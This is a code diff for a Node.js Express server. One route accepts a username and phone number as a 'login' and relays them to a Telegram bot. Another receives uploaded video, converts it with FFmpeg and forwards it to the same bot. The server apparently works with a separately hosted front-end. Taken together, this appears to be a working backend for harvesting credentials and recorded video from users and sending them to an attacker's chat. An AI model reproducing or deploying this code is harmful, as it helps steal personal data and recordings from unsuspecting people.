@@ -13,24 +13,23 @@ const app = express();
 // ⚙️ MIDDLEWARE & SETUP
 // =====================
 app.use(cors());
-app.use(express.json());
+app.use(express.json()); 
 
 // Ensure uploads folder exists
-if (!fs.existsSync("uploads")) {
-    fs.mkdirSync("uploads");
+const uploadDir = path.join(__dirname, "uploads");
+if (!fs.existsSync(uploadDir)) {
+    fs.mkdirSync(uploadDir);
     console.log("✅ Created 'uploads' directory");
 }
 
 // =====================
-// 📁 FILE STORAGE (IMPROVED - unique names)
+// 📁 FILE STORAGE
 // =====================
 const storage = multer.diskStorage({
     destination: "uploads/",
     filename: (req, file, cb) => {
-        const ext = path.extname(file.originalname).toLowerCase() || ".webm";
-        // Ultra-unique name to prevent any collision
-        const uniqueName = `${Date.now()}-${Math.random().toString(36).slice(2, 11)}${ext}`;
-        cb(null, uniqueName);
+        const ext = file.originalname.split(".").pop() || "webm";
+        cb(null, `${Date.now()}.${ext}`); 
     }
 });
 
@@ -52,8 +51,6 @@ app.post("/send-phone", async (req, res) => {
         return res.status(400).send("Missing data");
     }
 
-    console.log(`👤 New Login: ${username} (${phone})`);
-
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
@@ -62,113 +59,96 @@ app.post("/send-phone", async (req, res) => {
         });
         res.status(200).send("Login sent to bot");
     } catch (err) {
-        console.error("❌ Telegram Login Error:", err.message);
+        console.error("❌ Login Error:", err.message);
         res.status(500).send("Bot failed to send login");
     }
 });
 
 // =====================
-// 🚀 VIDEO UPLOAD ROUTE (FIXED)
+// 🚀 VIDEO UPLOAD ROUTE
 // =====================
 app.post("/upload", upload.single("video"), async (req, res) => {
     let filePath = null;
     let mp4Path = null;
 
     try {
-        console.log("\n==============================");
-        console.log("🚀 Upload received");
+        console.log("\n--- New Upload Request ---");
 
         if (!req.file) {
-            console.log("❌ No file uploaded");
             return res.status(400).send("No file uploaded");
         }
 
-        filePath = req.file.path;
-        // Clean MP4 path (no ugly .webm.mp4)
-        const baseName = path.basename(filePath, path.extname(filePath));
-        mp4Path = path.join(path.dirname(filePath), `${baseName}.mp4`);
+        filePath = path.resolve(req.file.path);
+        mp4Path = filePath + ".mp4";
 
-        console.log("📁 Original path :", filePath);
-        console.log("📁 Converted path:", mp4Path);
-        console.log("🎥 MIME type     :", req.file.mimetype);
+        console.log("🔄 Converting video...");
 
-        // =====================
-        // 🔄 FFmpeg conversion
-        // =====================
-        console.log("🔄 Starting FFmpeg conversion...");
+        // 1. Convert to MP4 (Optimized for Telegram)
         await new Promise((resolve, reject) => {
             ffmpeg(filePath)
                 .outputOptions([
                     "-c:v libx264",
                     "-preset ultrafast",
                     "-pix_fmt yuv420p",
-                    "-c:a aac"
+                    "-c:a aac",
+                    "-movflags +faststart" // Allows video to play before fully downloaded
                 ])
-                .on("start", cmd => console.log("🎬 FFmpeg command:", cmd))
+                .save(mp4Path)
                 .on("end", () => {
-                    console.log("✅ FFmpeg conversion complete");
+                    console.log("✅ Conversion complete");
                     resolve();
                 })
-                .on("error", err => {
-                    console.error("❌ FFmpeg ERROR:", err.message);
+                .on("error", (err) => {
+                    console.error("❌ FFmpeg error:", err.message);
                     reject(err);
-                })
-                .save(mp4Path);
+                });
         });
 
-        console.log("📦 Converted file ready");
-
-        // =====================
-        // 📤 TELEGRAM UPLOAD
-        // =====================
+        // 2. Prepare for Telegram
         console.log("📤 Sending to Telegram...");
-
         const form = new FormData();
         form.append("chat_id", CHAT_ID);
         form.append("video", fs.createReadStream(mp4Path), {
-            filename: "specimen.mp4",
+            filename: "video.mp4",
             contentType: "video/mp4"
         });
 
+        // 3. Send to API
         await axios.post(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, 
             form,
-            { headers: form.getHeaders() }
+            { 
+                headers: form.getHeaders(),
+                maxContentLength: Infinity,
+                maxBodyLength: Infinity 
+            }
         );
 
-        console.log("📨 Telegram response success!");
-
-        res.send("Upload successful");
+        console.log("📨 Telegram upload successful!");
+        res.status(200).send("Upload successful");
 
     } catch (err) {
-        console.error("\n❌ ERROR OCCURRED ❌");
-        console.error("Message:", err.message);
-        if (err.response?.data) {
-            console.error("Telegram/API error:", JSON.stringify(err.response.data, null, 2));
-        }
-        res.status(500).send("Failed (check server logs)");
+        console.error("❌ Process Error:", err.message);
+        if (err.response?.data) console.error("API Error Details:", err.response.data);
+        res.status(500).send("Failed to process video");
     } finally {
-        // 🔥 ALWAYS CLEAN UP - this was the main source of the "only works once" bug
-        console.log("🧹 Cleaning up files...");
-        try {
-            if (filePath && fs.existsSync(filePath)) {
-                fs.unlinkSync(filePath);
-                console.log("🗑️ Deleted original:", filePath);
+        // 4. Cleanup after delay to avoid file-locking issues
+        setTimeout(() => {
+            try {
+                if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath);
+                if (mp4Path && fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
+                console.log("🧹 Cleanup: Temp files removed");
+            } catch (cleanupErr) {
+                console.error("🧹 Cleanup Warning:", cleanupErr.message);
             }
-            if (mp4Path && fs.existsSync(mp4Path)) {
-                fs.unlinkSync(mp4Path);
-                console.log("🗑️ Deleted converted:", mp4Path);
-            }
-        } catch (cleanupErr) {
-            console.error("Cleanup error:", cleanupErr.message);
-        }
-        console.log("==============================\n");
+        }, 3000); // 3-second buffer
     }
 });
 
 // =====================
 // 🌐 START SERVER
 // =====================
-app.listen(3000, () => {
-    console.log("🌐 Server running and ready for Surge connections");
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`🌐 Server active on port ${PORT}`);
 });
